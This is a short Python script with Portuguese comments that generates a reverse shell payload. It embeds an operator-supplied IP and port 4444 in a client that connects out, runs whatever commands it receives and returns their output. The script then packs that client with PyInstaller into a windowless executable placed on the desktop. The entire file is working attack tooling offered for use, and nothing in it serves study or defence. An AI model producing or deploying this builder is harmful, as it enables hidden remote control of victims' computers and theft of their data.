# Script que gera o payload com IP fixo
import os
import sys
import platform
import subprocess
import importlib.util

def verificar_pyinstaller():
    """Verifica se o PyInstaller está instalado, e instala se necessário."""
    if importlib.util.find_spec("PyInstaller") is None:
        print("[!] PyInstaller não encontrado. Instalando...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("[+] PyInstaller instalado com sucesso.")
    else:
        print("[+] PyInstaller já está instalado.")

def gerar_payload(ip, porta=4444):
    """Gera o arquivo .py do reverse shell com IP embutido."""
    codigo = f'''import socket, subprocess

def main():
    ip = "{ip}"
    porta = {porta}

    try:
        s = socket.socket()
        s.connect((ip, porta))

        while True:
            comando = s.recv(1024).decode()

            if comando.lower() == 'exit':
                break

            try:
                resultado = subprocess.getoutput(comando)
                s.send(resultado.encode() if resultado else b"[+] Comando executado.")
            except Exception as e:
                s.send(f"[!] Erro: {{str(e)}}".encode())

        s.close()
    except Exception:
        pass

if __name__ == "__main__":
    main()
'''

    with open("payload.py", "w", encoding="utf-8") as f:
        f.write(codigo)
    print("[+] Arquivo payload.py criado com IP embutido.")

def gerar_executavel():
    """Gera o executável do payload na área de trabalho."""
    sistema = platform.system()
    if sistema == "Windows":
        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    elif sistema == "Linux":
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    else:
        print("[!] Sistema operacional não suportado para geração automática.")
        return

    nome_exec = "reverseshell.exe" if sistema == "Windows" else "reverseshell"

    comando = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole",
        "--distpath", desktop,
        "--name", nome_exec,
        "payload.py"
    ]

    subprocess.run(comando)
    print(f"[+] Executável gerado em: {desktop}")

def main():
    ip = input("Digite o IP do servidor: ")

    verificar_pyinstaller()
    gerar_payload(ip)
    gerar_executavel()

if __name__ == "__main__":
    main()
